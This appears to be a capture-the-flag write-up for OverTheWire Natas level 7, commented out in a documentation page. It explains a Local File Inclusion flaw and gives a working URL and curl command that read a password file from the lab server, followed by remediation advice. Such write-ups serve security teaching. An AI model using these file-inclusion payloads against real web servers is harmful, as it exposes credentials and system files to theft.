---
title: "Level 7"
description: Exploiting Local File Inclusion to read arbitrary files from the server.
sidebarTitle: "Level 7 — Local File Inclusion"
hidden: true
---

<!-- English content is temporarily disabled. Please refer to the Indonesian (id) version.

## Profile

- **Target:** `http://natas7.natas.labs.overthewire.org`
- **Credentials:** `natas7` / (password from Level 6)

## Reconnaissance

The page contains two links labeled "Home" and "About". The URLs reveal a parameter:

```
index.php?page=home
index.php?page=about
```

This suggests that the `page` parameter is passed to a PHP `include()` or `require()` call — a classic Local File Inclusion (LFI) pattern.

## Analysis

When an application uses user-supplied input to construct a file path for inclusion without proper sanitization, an attacker can read arbitrary files. The hint in the source confirms that the target password is stored at:

```
/etc/natas_webpass/natas8
```

## Exploitation

Modify the `page` parameter to point to the password file:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

The server includes the file directly into the response, leaking its contents.

The same can be done with `curl`:

```bash
curl -u natas7:$(cat password7) \
  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

## Remediation

- Never pass user input directly to `include()`, `require()`, or filesystem functions
- Use a whitelist of allowed page values mapped to actual file paths
- Disable dangerous PHP functions like `include()` when not needed

## References

- [OWASP: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

-->
